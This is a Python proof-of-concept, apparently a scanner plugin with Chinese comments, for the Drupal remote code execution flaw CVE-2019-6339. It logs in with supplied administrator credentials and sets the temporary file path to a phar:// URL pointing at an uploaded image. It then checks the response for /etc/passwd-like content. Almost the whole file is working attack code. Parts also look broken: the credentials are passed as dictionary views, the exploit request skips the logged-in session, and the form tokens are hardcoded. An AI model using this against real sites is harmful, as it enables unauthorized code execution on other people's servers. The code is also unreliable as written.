import requests
import datetime

# Drupal 远程代码执行漏洞
def poc(url, logindict, user_agent, proxy):
    url = url.strip("/")
    logurl = url + '/user/login'
    header = {
        'User-Agent': user_agent,
    }

    username=logindict.keys()
    password=logindict.values()

    sesion = requests.session()
    data = {
        "name": username,
        "pass": password,
        "form_build_id": 'form-dLmsWkfQ_wEGAoB-UQNpNc_ZDU1eB8aQIAihkVo5zy4',
        "form_id": 'user_login_form',
        "op": 'Log+in'
    }

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = sesion.post(logurl, headers=header, data=data, proxies=proxies)
    else:
        response = sesion.post(logurl, headers=header, data=data)

    if response.status_code == 200 and "Toolbar items" in response.text and 'Administration menu' in response.text:
        today_date = datetime.date.today()
        mytoday=str(today_date.year)+'-'+str(today_date.month)
        # 漏洞位置
        exploit_url = url+'/admin/config/media/file-system'
        datas = "file_temporary_path=phar%3A%2F%2F.%2Fsites%2Fdefault%2Ffiles%2Fpictures%2F"+mytoday+"%2Fblog-ZDI-CAN-7232-cat.jpg&temporary_maximum_age=21600&form_build_id=form-L_eIEqxhJRvSVrTMzGoIviUOBUbOE0O9gDJocsDsz6o&form_token=uPhA2oQJXzIU8beRdFPSS7aQmuBQk4hoNAQdA9_4OwA&form_id=system_file_system_settings&translation_path=sites%2Fdefault%2Ffiles%2Ftranslations&file_default_scheme=public&op=%E4%BF%9D%E5%AD%98%E9%85%8D%E7%BD%AE"

        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = requests.post(exploit_url, headers=header, data=datas, proxies=proxies)
        else:
            response = requests.post(exploit_url, data=datas, headers=header)

        if response.status_code == 200:
            if 'root' in response.text and 'daemon' in response.text:
                return 'Drupal - 远程代码执行漏洞    漏洞编号：CVE-2019-6339'

def run(url, logindict, user_agent, proxies):
    if logindict:
        result = poc(url, logindict, user_agent, proxies)
        return result


